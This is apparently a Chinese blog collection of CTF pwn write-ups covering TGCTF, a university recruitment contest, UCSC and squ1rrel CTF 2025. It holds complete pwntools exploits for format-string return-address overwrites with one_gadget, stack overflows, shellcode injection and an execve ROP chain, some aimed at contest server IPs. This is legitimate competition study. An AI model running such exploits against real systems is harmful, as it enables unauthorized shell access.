<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome TGCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your gift %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">1131796</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    magic = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会给我们一个栈上的地址，存在格式化字符漏洞但是只能利用一次，read很小无法溢出，所以只能尝试通过格式化字符漏洞任意写控制执行流构造二次输入，泄露libc基址，打one_gadget</p>
<p>通过gdb调试到存在格式化字符漏洞的printf处</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG6.png" alt="1"></p>
<p>可以发现printf的返回地址被放到了buf起始地址之前也就是buf - 8的位置返回地址为0x401276而read的地址是0x40123D将返回地址修改为read的地址即可构造二次输入</p>
<p>利用%n可以将目前输入的字符数覆盖到指定的地址，可以通过%hn写入 一个short类型的值覆盖两个字节，也可以通过%hhn写入一个  signed char   类型的值覆盖一个字节。返回地址与read地址之间只是低位有一个字节的区别两种方式均可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x401276   --&gt;   76 12 40 00</span><br><span class="line">0x40123D   --&gt;   3D 12 40 00</span><br></pre></td></tr></table></figure>

<p>选择使用%hn覆盖则需要输出0x123D个字节也就是4669个字节，使用%n覆盖返回地址还需指定地址，也就是前面题目给的栈地址-8注意参数具体是第几个。</p>
<p>两种写法：</p>
<p>单字节写入，格式化字符占0x18个字节在栈上也就是3个参数的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0</span>:<span class="string">&quot;%&#123;&#125;c%9$hhn%19$p&quot;</span>.<span class="built_in">format</span>(<span class="number">0x3D</span>),</span><br><span class="line">        <span class="number">0x18</span>:p64(stack - <span class="number">8</span>)  <span class="comment"># 修改 buf + 0x18 的值</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>注：在指定参数时rdi是算格式字符也就是 format 而我们指定的参数是 arg ，arg1是存储在rsi中寄存器存储5个参数第6个参数位于栈上，我们格式化字符占了0x18个字节，p64(stack - 8)也就是栈上的第4个参数</p>
<p>双字节写入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span> + <span class="string">b&quot;%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>控制过执行流后接收libc二次利用格式化字符漏洞将执行流转至one_gadget处看了gets大佬的wp又学到了新姿势</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>).encode()</span><br><span class="line">payload += (<span class="string">b&quot;c%10$hn%&quot;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - (one_gadget &amp; <span class="number">0xFFFF</span>)).encode())</span><br><span class="line">payload += <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span> + <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>这个payload最后是修改的部分是main函数末尾通过leave ret跳转到exit处将该地址利用任意写改成了one_gadget的地址</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG8.png" alt="1"></p>
<p>可以看到是stack地址加0x68处</p>
<p><code> str(one_gadget &amp; 0xFFFF).encode()</code>这部分是为了获取one_gadget的低16位并将低 16 位转换为字符串并编码为字节流</p>
<p><code> str(((one_gadget &gt;&gt; 16) &amp; 0xFFFF) - (one_gadget &amp; 0xFFFF)).encode())</code>将   one_gadget   右移 16 位，获取高 16 位的值接着计算高 16 位和低 16 位的差值，将差值转换为字符串并编码为字节流</p>
<p> <code>p64(stack + 0x68) </code> ：将   stack + 0x68   的地址转换为 8 字节的小端字节流。这个地址是低 16 位的写入目标。</p>
<p> <code>p64(stack + 0x68 + 2) </code>：将   stack + 0x68 + 2   的地址转换为 8 字节的小端字节流。这个地址是高 16 位的写入目标。</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node1.tgctf.woooo.tech&#x27;,30480)</span></span><br><span class="line">io = process(</span><br><span class="line">    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span><br><span class="line">)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one =<span class="number">0xe3b01</span></span><br><span class="line">read=<span class="number">0x40123D</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your gift &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span> + <span class="string">b&quot;%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">one_gadget = one+base</span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>).encode()</span><br><span class="line">payload += (<span class="string">b&quot;c%10$hn%&quot;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - (one_gadget &amp; </span><br><span class="line"><span class="number">0xFFFF</span>)).encode())</span><br><span class="line">payload += <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span> + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;cat f*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>比赛的时候one_gadget版本太老了找到的和wp里的不一样就很难受</p>
<h4 id="process新姿势："><a href="#process新姿势：" class="headerlink" title="process新姿势："></a>process新姿势：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = process(</span><br><span class="line">    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="西南科大校队招新赛"><a href="#西南科大校队招新赛" class="headerlink" title="西南科大校队招新赛"></a>西南科大校队招新赛</h2><p>pwn01</p>
<p>ret2text</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8090</span>)</span><br><span class="line">backdoor = <span class="number">0x080491F6</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;2732yg_cbhbc_999&#125;</code></p>
<p>pwn02</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8091</span>)</span><br><span class="line">target = <span class="number">0x0804C030</span></span><br><span class="line">payload= fmtstr_payload(<span class="number">4</span>,&#123;target:<span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;182hh_jsidj_28ddss&#125;</code></p>
<p>gift</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8094</span>)</span><br><span class="line">ret = <span class="number">0x400451</span></span><br><span class="line">gift  = <span class="number">0x4005C4</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(gift)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;gift_1s_4_v3ry_l0ng_fl4g_s3cur1ty_k3y5_ABCD1234!@#$&#125;</code></p>
<p>shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8098</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;gift-&gt;&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf))</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) + p32(buf)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;m3ss4g3_1n_th3_b1n4ry_f1l3_0xDEADBEEF_1337&#125;</code></p>
<h2 id="UCSC"><a href="#UCSC" class="headerlink" title="UCSC"></a>UCSC</h2><h3 id="BoFido-ucsc"><a href="#BoFido-ucsc" class="headerlink" title="BoFido-ucsc"></a>BoFido-ucsc</h3><p>伪随机数，read处存在溢出可以覆盖种子，但无法直接覆盖v4，若种子固定则输出的随机数序列一定，循环十次若十次输入数字和随机数生成的一样即可获得shell</p>
<p>main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the lottery game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now start your game!&quot;</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = rand() % <span class="number">255</span>;</span><br><span class="line">    v9 = rand() % <span class="number">255</span>;</span><br><span class="line">    v8 = rand() % <span class="number">255</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Round %d, please choose your numbers:\n&quot;</span>, i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v6, &amp;v5, &amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The lucky number is: %d %d %d\n&quot;</span>, v10, v9, v8);</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == v6 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v9 == v5 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == v4 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the first prize!&quot;</span>);</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the second prize!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the third prize!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won nothing!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re so lucky! Here is your gift!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;See you next time!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将随机数种子覆盖为一</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1</span><br></pre></td></tr></table></figure>

<p>0x20个a加上一个1</p>
<p>seed为1时生成10个随机数序列为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">171 153 203</span><br><span class="line">202 0 183</span><br><span class="line">201 70 206</span><br><span class="line">195 45 120</span><br><span class="line">165 188 58</span><br><span class="line">252 232 96</span><br><span class="line">178 16 144</span><br><span class="line">65 93 195</span><br><span class="line">202 99 159</span><br><span class="line">236 80 162</span><br></pre></td></tr></table></figure>

<p>依次输入即可</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/%E9%9A%8F%E6%9C%BA%E6%95%B0.png" alt="1"></p>
<h1 id="国际赛"><a href="#国际赛" class="headerlink" title="国际赛"></a>国际赛</h1><h2 id="squ1rrel-CTF-2025"><a href="#squ1rrel-CTF-2025" class="headerlink" title="squ1rrel CTF 2025"></a>squ1rrel CTF 2025</h2><h3 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h3><p>还不太会分析docker文件就先贴个大佬的exp</p>
<p>Solved by Winegee：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./prison&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;20.84.72.194&quot;</span>, <span class="number">5001</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./prison&quot;</span>)</span><br><span class="line"><span class="comment"># 0x0000000000401a1a : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401a0d : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000413676 : pop rsi ; pop rbp ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x401a0d</span></span><br><span class="line">pop_rdx = <span class="number">0x401a1a</span></span><br><span class="line">pop_rsi_rbp = <span class="number">0x413676</span></span><br><span class="line">bss = <span class="number">0x00000000004ccac0</span></span><br><span class="line"><span class="comment"># 0x000000000041f464 : pop rax ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x41f464</span></span><br><span class="line"><span class="comment"># 0x00000000004013b8 : syscall</span></span><br><span class="line">syscall = <span class="number">0x4013b8</span></span><br><span class="line"><span class="comment"># 0x00000000004450f8 : pop rsp ; ret</span></span><br><span class="line">pop_rsp = <span class="number">0x4450f8</span></span><br><span class="line"><span class="comment"># sla(b&quot;They gave you the premium stay so at least you get to choose your cell (1-6): &quot;, str(1))</span></span><br><span class="line">sla(<span class="string">b&quot;They gave you the premium stay so at least you get to choose your cell (1-6): &quot;</span>, <span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your cellmate is &quot;</span>)</span><br><span class="line">stack_pointer = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">rop_addr = stack_pointer - (<span class="number">0x8b0</span> - <span class="number">0x7c0</span>)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_rbp) + p64(rop_addr) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x200</span>) + p64(elf.sym[<span class="string">&quot;read&quot;</span>]) + p64(<span class="number">0</span>) + p64(pop_rsp) + p64(rop_addr)</span><br><span class="line"><span class="comment"># payload = payload.ljust(, b&quot;\x00&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sa(<span class="string">b&quot;Now let&#x27;s get the registry updated. What is your name: &quot;</span>, payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bi&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span> * <span class="number">9</span></span><br><span class="line">payload += p64(pop_rdi) + p64(rop_addr) + p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># squ1rrel&#123;m4n_0n_th3_rUn_fr0m_NX_pr1s0n!&#125;</span></span><br></pre></td></tr></table></figure>

<p>Solved by pfwqdxwdd：</p>
